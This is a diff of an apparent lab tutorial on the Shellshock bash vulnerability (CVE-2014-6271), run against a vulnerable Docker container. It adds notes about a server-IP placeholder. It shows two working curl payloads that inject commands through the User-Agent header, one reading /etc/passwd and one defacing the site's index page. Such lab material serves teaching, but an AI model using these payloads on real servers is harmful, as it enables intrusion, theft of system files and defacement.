@@ -13,11 +13,15 @@ docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
 
 * Step 3: From the terminal exploit the vulnerability and access `/etc/passwd` of the vulnerable container
 
+>> Note: `$(serverip)` will automatically takes your server ip.
+
 ```commandline
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$(serverip):8080/cgi-bin/vulnerable
 ```
 
 * Step 4: By exploiting ShellShock, deface the website
+
+>> Note: `$(serverip)` will automatically takes your server ip.
 
 ```commandline
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://$(serverip):8080/cgi-bin/vulnerable
